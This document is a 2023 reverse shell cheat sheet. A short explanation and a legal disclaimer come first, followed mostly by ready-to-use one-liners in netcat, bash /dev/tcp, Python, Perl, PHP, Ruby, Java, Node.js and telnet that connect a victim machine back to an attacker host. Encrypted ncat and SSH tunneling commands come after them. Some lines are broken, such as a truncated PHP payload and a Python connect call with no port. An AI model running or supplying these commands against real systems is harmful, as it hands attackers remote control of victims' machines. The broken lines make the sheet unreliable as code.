Reverse Shells.  Alphakilonine, 2023

# A reverse shell is a type of shell in which a compromised system connects back to an attacker's system or server, rather than the other way around. It's a common technique used by
# hackers to gain remote access and control over a target system. Here's how it typically works:
#
# 1. **Payload Creation**: The attacker typically creates a malicious payload, often in the form of a script or executable, that contains code to establish a reverse connection.
#
# 2. **Payload Execution**: The attacker somehow manages to get the payload executed on the target system. This can be done through various means, such as exploiting vulnerabilities,
# social engineering, or tricking the victim # # into running the malicious code.
#
# 3. **Connection Establishment**: Once the payload is executed on the victim's system, it initiates a connection back to the attacker's system. This connection can be over a network
# protocol like TCP or UDP.
#
# 4. **Shell Access**: After the connection is established, the attacker gains remote access to the victim's system and can execute commands, access files, and control the compromised
# system as if they had physical access to it.
#
# Reverse shells can be used for various purposes, including:
#
# - **Maintaining Access**: Attackers use reverse shells to maintain access to a compromised system, allowing them to continue their activities even if the initial point of entry is
# discovered and closed.
#
# - **Data Exfiltration**: Attackers can use reverse shells to steal sensitive data from the compromised system and send it back to their own server.
#
# - **Further Exploitation**: Reverse shells can serve as a pivot point for further attacks within a target network, potentially leading to lateral movement and privilege escalation.
#
# It's essential to note that the creation and use of reverse shells for unauthorized access to computer systems are illegal and unethical. Reverse shells should only be used for
# legitimate purposes, such as penetration testing # on systems where you have explicit permission to do so or for system administration tasks when managing remote systems. Unauthorized
# use of reverse shells is a criminal activity and can result in severe legal consequences.

#Reverse Shells

#Linux
nc <ip-address> <port> -e /bin/sh

#listener stars on attacker system
nc -lnvp 80

#reverse shell starts on victim machine
nc -e /bin/sh ATTACKING-IP 80

#useful syntax
/bin/sh | nc ATTACKING-IP 80
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p

#Windows
nc <ip-address> <port> -e cmd.exe

#Bash
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1

#Python (Replace IP Address)
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<IP_ADDRESS>")); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

#perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

#php
IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>

#Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

#Node.js
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');

#telnet
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet

#Cisco IOS Enabled SSH outbound
#enable
#configure terminal
#line (line-number ending-line-number)
#no exec
#login authentication listname
#transport input ssh
#exit
#exit
#ssh -l userid : {number} {ip-address}

#encrypted reverse shells

#ncat
ncat --ssl-ciphers <HIGH:!aNULL:!eNULL> <server> 443

#ncat server
ncat -v --listen --ssl
#
# SSH Tunneling (useful when only SSH is open) - forward other protocols through the tunnel like HTTPS, HTTP, SMTP, ncat etc.
#
#ssh local port forwarding
ssh -L local_port:destination_server_ip:remote_port ssh_server_hostname

#ssh â€“L 5901:188.17.0.5:4492 pnap@ssh.server.com
